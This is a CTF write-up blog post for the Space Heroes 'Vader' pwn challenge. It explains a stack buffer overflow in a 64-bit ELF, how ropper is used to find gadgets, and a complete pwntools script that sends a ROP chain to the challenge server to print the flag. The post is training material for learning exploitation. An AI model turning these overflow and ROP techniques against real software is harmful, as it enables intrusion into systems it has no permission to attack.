---
title: "shctf/pwn: Vader"
date: 2022-06-07 10:41:26
categories:
- ctfs
- shctf
- pwn
tags:
- pwn
- buffer-overflow
- rop-chain
description: "Learn how to exploit ELF binaries using ROP, building a chain of \"gadgets\" on the stack to pass arguments to a function! This is my writeup for the Space Heroes CTF binary/pwn challenge \"Vader\"."
permalink: ctfs/shctf/pwn/vader/
thumbnail: /asset/banner/banner-vader.png
---

<style>
    .box {
        border: 1px solid rgb(23, 25, 27);
        border-radius: 5px;
        background-color: rgb(23, 25, 27);
        padding: 1rem;
        font-size: 90%;
        text-align: center;
        margin-top: 1rem;
        margin-bottom: 1rem;
    }
</style>

<div class="box">
Submit flag from <code>/flag.txt</code> from <code>0.cloud.chals.io:20712</code><br>
<b>Author</b>: v10l3nt<br>
<b>Files</b>: <a href="/asset/shctf/vader">vader</a>
</div>

<figure class="highlight console">
  <figcaption><span>checksec.sh</span><a target="_blank" rel="noopener"
      href="https://github.com/slimm609/checksec.sh"><span style="color:#82C4E4">github link</span></a></figcaption>
    <table>
            <td class="code">
                 <pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">checksec vader</span><br><span class="line">[<span style="color:#277FFF"><b>*</b></span>] '/home/kali/ctfs/shctf/pwn/vader/vader'</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    <span style="color:#FEA44C">Partial RELRO</span></span><br><span class="line">    Stack:    <span style="color:#D41919">No canary found</span></span><br><span class="line">    NX:       <span style="color:#5EBDAB">NX enabled</span></span><br><span class="line">    PIE:      <span style="color:#D41919">No PIE (0x400000)</span></span><br></pre>
            </td>
        </tr>
    </table>
</figure>

As with any binary-only challenge, the first thing we must do is boot it up in the **Ghidra** disassembler. Looking through the code we can check what our main function does:

```c
undefined8 main(void)

{
  char local_28 [32];
  
  print_darth();
  printf("\n\nWhen I left you, I was but the learner. Now I am the master >>> ");
  fgets(local_28,0x100,stdin);
  return 0;
}
```

Looks like it reads our input (`stdin`) with a fixed length (256) through `fgets()`. Let's continue sifting around:

```c
void vader(char *param_1,char *param_2,char *param_3,char *param_4,char *param_5)

{
  int iVar1;
  undefined8 local_38;
  undefined8 local_30;
  undefined8 local_28;
  undefined8 local_20;
  FILE *local_10;
  
  iVar1 = strcmp(param_1,"DARK");
  if (iVar1 == 0) {
    iVar1 = strcmp(param_2,"S1D3");
    if (iVar1 == 0) {
      iVar1 = strcmp(param_3,"OF");
      if (iVar1 == 0) {
        iVar1 = strcmp(param_4,"TH3");
        if (iVar1 == 0) {
          iVar1 = strcmp(param_5,"FORC3");
          if (iVar1 == 0) {
            local_38 = 0;
            local_30 = 0;
            local_28 = 0;
            local_20 = 0;
            local_10 = (FILE *)0x0;
            local_10 = fopen("flag.txt","r");
            fgets((char *)&local_38,0x30,local_10);
            printf("<<< %s\n",&local_38);
          }
        }
      }
    }
    else {
      printf("You are a wretched thing, of weakness and fear.");
    }
    exit(1);
  }
  return;
}
```

The goal is now clear: call the `vader()` function with five correct arguments to print the flag. Simple, right? Let's start building our chain.

Firstly, we need to calculate our **offset**. Although we can brute this by simply passing a `cyclic` string and seeing what's overwritten the `$rsp` register, we can see that in the `main()` function, 32 bytes are allocated to `char local_28`. If we add 8 bytes to cover the `$rbp` register, our offset is 40.

Next in line is the process of getting our arguments on the stack. Arguments to be passed into functions are held in **registers** -- since this is a 64-bit binary, we need to figure out which ones we need to use to pass the correct arguments (`DARK`, `S1D3`, `OF`, `TH3`, `FORC3`) into `vader()`. Referencing [this x64 cheatsheet](https://cs.brown.edu/courses/cs033/docs/guides/x64_cheatsheet.pdf):

> To call a function, the program should place the first six integer or pointer parameters in the registers $rdi, $rsi, $rdx, $rcx, $r8, and $r9; subsequent parameters (or parameters larger than 64 bits) should be pushed onto the stack, with the first argument topmost. The program should then execute the call instruction, which will push the return address onto the stack and jump to the start of the specified function.

Therefore, we need to put our arguments into `$rdi`, `$rsi`, `$rdx`, `$rcx`, and `$r8`. The main method of doing this is via **gadgets**, or simple assembly instructions that can be used to `pop` specific registers from the stack. After the `pop`, we can repopulate the register with our own address that represents the required string (this address will be located within the binary). Additionally, they almost always have a `ret` instruction at the end to return to *even more* gadgets, therefore creating a **ROP chain**.

**Note**: The program literally provides gadget functions for you:

```properties
00000000004011c9 <gadget1>:
  4011c9: 55                    push   rbp
  4011ca: 48 89 e5              mov    rbp,rsp
  4011cd: 59                    pop    rcx
  4011ce: 5a                    pop    rdx
  4011cf: c3                    ret    
  4011d0: 90                    nop
  4011d1: 5d                    pop    rbp
  4011d2: c3                    ret    

00000000004011d3 <gadget2>:
  4011d3: 55                    push   rbp
  4011d4: 48 89 e5              mov    rbp,rsp
  4011d7: 41 59                 pop    r9
  4011d9: 41 58                 pop    r8
  4011db: c3                    ret    
  4011dc: 90                    nop
  4011dd: 5d                    pop    rbp
  4011de: c3                    ret    
```

Although you can use these, it's not really in the nature of a ROP challenge, so I will be finding the gadgets manually!

To find the gadgets we need, we will be utilizing a program called `ropper` and `grep`-ing the output:

<figure class="highlight console">
  <figcaption><span>ropper.py usage</span><a target="_blank" rel="noopener"
      href="https://www.kali.org/tools/ropper/"><span style="color:#82C4E4">documentation</span></a></figcaption>
  <table>
    <tr>
      <td class="code">
        <pre><span class="meta prompt_">$ </span>ropper -f vader | grep &quot;rdi&quot;
<span style="color:#5EBDAB">[INFO]</span> Load gadgets from cache
<span style="color:#5EBDAB">[LOAD]</span> loading... <span style="color:#E6E6E6">100%</span>
<span style="color:#5EBDAB">[LOAD]</span> removing double gadgets... <span style="color:#E6E6E6">100%</span>
<span style="color:#D41919">0x000000000040145e</span>: <span style="color:#FF8A18"><b>add</b></span> <span style="color:#E6E6E6">byte ptr [rax], al</span><span style="color:#277FFF"><b>; </b></span><span style="color:#FF8A18"><b>mov</b></span> <span style="color:#EC0101"><b>rdi</b></span>, rax<span style="color:#277FFF"><b>; </b></span><span style="color:#FF8A18"><b>call</b></span> <span style="color:#E6E6E6">0x1030</span><span style="color:#277FFF"><b>; </b></span><span style="color:#FF8A18"><b>nop</b></span><span style="color:#277FFF"><b>; </b></span><span style="color:#FF8A18"><b>pop</b></span> <span style="color:#E6E6E6">rbp</span><span style="color:#277FFF"><b>; </b></span><span style="color:#FF8A18"><b>ret</b></span><span style="color:#277FFF"><b>; </b></span>
<span style="color:#D41919">0x00000000004011bc</span>: <span style="color:#FF8A18"><b>add</b></span> <span style="color:#E6E6E6">byte ptr [rax], al</span><span style="color:#277FFF"><b>; </b></span><span style="color:#FF8A18"><b>mov</b></span> <span style="color:#EC0101"><b>rdi</b></span>, rax<span style="color:#277FFF"><b>; </b></span><span style="color:#FF8A18"><b>call</b></span> <span style="color:#E6E6E6">0x1040</span><span style="color:#277FFF"><b>; </b></span><span style="color:#FF8A18"><b>nop</b></span><span style="color:#277FFF"><b>; </b></span><span style="color:#FF8A18"><b>pop</b></span> <span style="color:#E6E6E6">rbp</span><span style="color:#277FFF"><b>; </b></span><span style="color:#FF8A18"><b>ret</b></span><span style="color:#277FFF"><b>; </b></span>
<span style="color:#D41919">0x00000000004015e9</span>: <span style="color:#FF8A18"><b>add</b></span> <span style="color:#E6E6E6">byte ptr [rax], al</span><span style="color:#277FFF"><b>; </b></span><span style="color:#FF8A18"><b>mov</b></span> <span style="color:#EC0101"><b>rdi</b></span>, rax<span style="color:#277FFF"><b>; </b></span><span style="color:#FF8A18"><b>call</b></span> <span style="color:#E6E6E6">0x1060</span><span style="color:#277FFF"><b>; </b></span><span style="color:#FF8A18"><b>mov</b></span> <span style="color:#E6E6E6">eax, 0</span><span style="color:#277FFF"><b>; </b></span><span style="color:#FF8A18"><b>leave</b></span><span style="color:#277FFF"><b>; </b></span><span style="color:#FF8A18"><b>ret</b></span><span style="color:#277FFF"><b>; </b></span>
<span style="color:#D41919">0x00000000004010b7</span>: <span style="color:#FF8A18"><b>mov</b></span> <span style="color:#E6E6E6">ecx, 0x401600</span><span style="color:#277FFF"><b>; </b></span><span style="color:#FF8A18"><b>mov</b></span> <span style="color:#EC0101"><b>rdi</b></span>, 0x4015b5<span style="color:#277FFF"><b>; </b></span><span style="color:#FF8A18"><b>call</b></span> <span style="color:#E6E6E6">qword ptr [rip + 0x3f26]</span><span style="color:#277FFF"><b>; </b></span><span style="color:#FF8A18"><b>hlt</b></span><span style="color:#277FFF"><b>; </b></span><span style="color:#FF8A18"><b>nop</b></span> <span style="color:#E6E6E6">dword ptr [rax + rax]</span><span style="color:#277FFF"><b>; </b></span><span style="color:#FF8A18"><b>ret</b></span><span style="color:#277FFF"><b>; </b></span>
<span style="color:#D41919">0x00000000004010b6</span>: <span style="color:#FF8A18"><b>mov</b></span> <span style="color:#E6E6E6">rcx, 0x401600</span><span style="color:#277FFF"><b>; </b></span><span style="color:#FF8A18"><b>mov</b></span> <span style="color:#EC0101"><b>rdi</b></span>, 0x4015b5<span style="color:#277FFF"><b>; </b></span><span style="color:#FF8A18"><b>call</b></span> <span style="color:#E6E6E6">qword ptr [rip + 0x3f26]</span><span style="color:#277FFF"><b>; </b></span><span style="color:#FF8A18"><b>hlt</b></span><span style="color:#277FFF"><b>; </b></span><span style="color:#FF8A18"><b>nop</b></span> <span style="color:#E6E6E6">dword ptr [rax + rax]</span><span style="color:#277FFF"><b>; </b></span><span style="color:#FF8A18"><b>ret</b></span><span style="color:#277FFF"><b>; </b></span>
<span style="color:#D41919">0x00000000004010bd</span>: <span style="color:#FF8A18"><b>mov</b></span> <span style="color:#EC0101"><b>rdi</b></span>, 0x4015b5<span style="color:#277FFF"><b>; </b></span><span style="color:#FF8A18"><b>call</b></span> <span style="color:#E6E6E6">qword ptr [rip + 0x3f26]</span><span style="color:#277FFF"><b>; </b></span><span style="color:#FF8A18"><b>hlt</b></span><span style="color:#277FFF"><b>; </b></span><span style="color:#FF8A18"><b>nop</b></span> <span style="color:#E6E6E6">dword ptr [rax + rax]</span><span style="color:#277FFF"><b>; </b></span><span style="color:#FF8A18"><b>ret</b></span><span style="color:#277FFF"><b>; </b></span>
<span style="color:#D41919">0x0000000000401460</span>: <span style="color:#FF8A18"><b>mov</b></span> <span style="color:#EC0101"><b>rdi</b></span>, rax<span style="color:#277FFF"><b>; </b></span><span style="color:#FF8A18"><b>call</b></span> <span style="color:#E6E6E6">0x1030</span><span style="color:#277FFF"><b>; </b></span><span style="color:#FF8A18"><b>nop</b></span><span style="color:#277FFF"><b>; </b></span><span style="color:#FF8A18"><b>pop</b></span> <span style="color:#E6E6E6">rbp</span><span style="color:#277FFF"><b>; </b></span><span style="color:#FF8A18"><b>ret</b></span><span style="color:#277FFF"><b>; </b></span>
<span style="color:#D41919">0x00000000004011be</span>: <span style="color:#FF8A18"><b>mov</b></span> <span style="color:#EC0101"><b>rdi</b></span>, rax<span style="color:#277FFF"><b>; </b></span><span style="color:#FF8A18"><b>call</b></span> <span style="color:#E6E6E6">0x1040</span><span style="color:#277FFF"><b>; </b></span><span style="color:#FF8A18"><b>nop</b></span><span style="color:#277FFF"><b>; </b></span><span style="color:#FF8A18"><b>pop</b></span> <span style="color:#E6E6E6">rbp</span><span style="color:#277FFF"><b>; </b></span><span style="color:#FF8A18"><b>ret</b></span><span style="color:#277FFF"><b>; </b></span>
<span style="color:#D41919">0x00000000004015eb</span>: <span style="color:#FF8A18"><b>mov</b></span> <span style="color:#EC0101"><b>rdi</b></span>, rax<span style="color:#277FFF"><b>; </b></span><span style="color:#FF8A18"><b>call</b></span> <span style="color:#E6E6E6">0x1060</span><span style="color:#277FFF"><b>; </b></span><span style="color:#FF8A18"><b>mov</b></span> <span style="color:#E6E6E6">eax, 0</span><span style="color:#277FFF"><b>; </b></span><span style="color:#FF8A18"><b>leave</b></span><span style="color:#277FFF"><b>; </b></span><span style="color:#FF8A18"><b>ret</b></span><span style="color:#277FFF"><b>; </b></span>
<span style="color:#D41919">0x00000000004010f6</span>: <span style="color:#FF8A18"><b>or</b></span> <span style="color:#E6E6E6">dword ptr [</span><span style="color:#EC0101"><b>rdi</b></span> + 0x405060], edi<span style="color:#277FFF"><b>; </b></span><span style="color:#FF8A18"><b>jmp</b></span> <span style="color:#E6E6E6">rax</span><span style="color:#277FFF"><b>; </b></span>
<span style="color:#D41919">0x000000000040165b</span>: <span style="color:#FF8A18"><b>pop</b></span> <span style="color:#EC0101"><b>rdi</b></span><span style="color:#277FFF"><b>; </b></span><span style="color:#FF8A18"><b>ret</b></span><span style="color:#277FFF"><b>; </b></span>
</pre>
      </td>
    </tr>
  </table>
</figure>

Check it out -- at the bottom of the code block (`0x40165b`) there's a perfect gadget for us to use! Let's find ones for the rest of them:

<figure class="highlight text">
  <figcaption><span>(truncated for brevity)</span></figcaption>
  <table>
    <tr>
      <td class="code">
        <pre><span style="color:#D41919">0x0000000000401659</span>: <span style="color:#FF8A18"><b>pop</b></span> <span style="color:#EC0101"><b>rsi</b></span><span style="color:#277FFF"><b>; </b></span><span style="color:#FF8A18"><b>pop</b></span> <span style="color:#E6E6E6">r15</span><span style="color:#277FFF"><b>; </b></span><span style="color:#FF8A18"><b>ret</b></span><span style="color:#277FFF"><b>; </b></span><br><span class="line"><span style="color:#D41919">0x00000000004011ce</span>: <span style="color:#FF8A18"><b>pop</b></span> <span style="color:#EC0101"><b>rdx</b></span><span style="color:#277FFF"><b>; </b></span><span style="color:#FF8A18"><b>ret</b></span><span style="color:#277FFF"><b>; </b></span></span><br><span class="line"><span style="color:#D41919">0x00000000004011d8</span>: <span style="color:#FF8A18"><b>pop</b></span> <span style="color:#EC0101"><b>rcx</b></span><span style="color:#277FFF"><b>; </b></span><span style="color:#FF8A18"><b>pop</b></span> <span style="color:#E6E6E6">r8</span><span style="color:#277FFF"><b>; </b></span><span style="color:#FF8A18"><b>ret</b></span><span style="color:#277FFF"><b>; </b></span></span><br></pre>
      </td>
    </tr>
  </table>
</figure>

The first `pop rsi; pop r15;` isn't ideal, as it's popping a redundant register -- we'll need to repopulate it with 8 bytes of garbage. On the other hand, the `pop rcx; pop r8;` takes care of two registers at once!

With that, we can draw up a visual of what our final payload will look like:

![Payload Visual](/asset/shctf/payload-visual.png)

The last thing we need to do is to find the hex addresses of our argument strings:

![Ghidra Strings](/asset/shctf/strings.png)

Don't forget the address of `vader()` too!:

<figure class="highlight plaintext">
  <figcaption><span>gdb-gef x command</span><a target="_blank" rel="noopener"
      href="https://visualgdb.com/gdbreference/commands/x"><span style="color:#82C4E4">documentation</span></a>
  </figcaption>
  <table>
    <tr>
      <td class="code">
        <pre><span style="color:#EC0101"><b>gef➤  </b></span>x vader
<span style="color:#367BF0">0x40146b</span> &lt;<span style="color:#FEA44C">vader</span>&gt;:	0xe5894855
</pre>
      </td>
    </tr>
  </table>
</figure>


Here is my final script, which defines a variable for each section of our gigantic payload -- this is for enhanced readability. I've also used the `p64()` function, which converts the address into little endian:

<figure class="highlight py">
  <figcaption><span>vader.py</span><a target="_blank" rel="noopener"
      href="https://gist.github.com/jktrn/a499cfd248125a9d57924f8f602fda30"><span style="color:#82C4E4">github gist link</span></a></figcaption>
  <table>
    <tr>
      <td class="gutter">
        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre>
      </td>
      <td class="code">
        <pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">offset =        <span class="string">b&#x27;A&#x27;</span>*<span class="number">40</span>         <span class="comment"># OVERFLOWING 32 + 8 BYTES FOR $RBP</span></span><br><span class="line"></span><br><span class="line">rdi =           p64(<span class="number">0x0040165b</span>) <span class="comment"># RDI, RSI, RDX, RCX, &amp; R8 ARE ARGS REGISTERS</span></span><br><span class="line">rsi_r15 =       p64(<span class="number">0x00401659</span>)</span><br><span class="line">rdx =           p64(<span class="number">0x004011ce</span>)</span><br><span class="line">rcx_r8 =        p64(<span class="number">0x004011d8</span>)</span><br><span class="line"></span><br><span class="line">dark =          p64(<span class="number">0x00402ec9</span>) <span class="comment"># ADDRESSES FOR STRINGS IN THE BINARY</span></span><br><span class="line">side =          p64(<span class="number">0x00402ece</span>)</span><br><span class="line">r15_garbage =   p64(<span class="number">0xCAFEBEEF</span>) <span class="comment"># GARBAGE</span></span><br><span class="line">of =            p64(<span class="number">0x00402ed3</span>)</span><br><span class="line">the =           p64(<span class="number">0x00402ed6</span>)</span><br><span class="line">force =         p64(<span class="number">0x00402eda</span>)</span><br><span class="line"></span><br><span class="line">vader =         p64(<span class="number">0x0040146b</span>)</span><br><span class="line"></span><br><span class="line">payload = offset</span><br><span class="line">payload += rdi + dark                   <span class="comment"># POP RDI, STORING &quot;DARK&quot;</span></span><br><span class="line">payload += rsi_r15 + side + r15_garbage <span class="comment"># POP RSI &amp; R15, STORE &quot;S1D3&quot; + GARBAGE</span></span><br><span class="line">payload += rdx + of                     <span class="comment"># POP RDX, STORING &quot;OF&quot;</span></span><br><span class="line">payload += rcx_r8 + the + force         <span class="comment"># POP RCX &amp; R8, STORING &quot;TH3&quot; + &quot;FORC3&quot;</span></span><br><span class="line">payload += vader                        <span class="comment"># ADDRESS OF VADER</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;0.cloud.chals.io&quot;</span>, <span class="number">20712</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">log.success(p.recvallS())</span><br><span class="line">p.close()</span><br></pre>
      </td>
    </tr>
  </table>
</figure>

I don't usually do this, but here's a clip of me initially solving the challenge by running the above script:

{% youtube rvMORfSC2CU %}

This is considered a "simple" challenge for those experienced with the field of return-oriented programming within pwn/binary challenges. However, I had none prior to this competition, so <kbd>Vader</kbd> was one of the most time-consuming and annoying challenges to work with. Yet, it was probably the most satisfying solve throughout the entire competition, and it was my first time utilizing gadgets and building a ROP chain. I hope you enjoyed!

<a href="https://info.flagcounter.com/8Xkk"><img src="https://s01.flagcounter.com/count2/8Xkk/bg_212326/txt_C9CACC/border_C9CACC/columns_3/maxflags_12/viewers_3/labels_0/pageviews_1/flags_1/percent_0/" alt="Free counters!" border="0"></a>
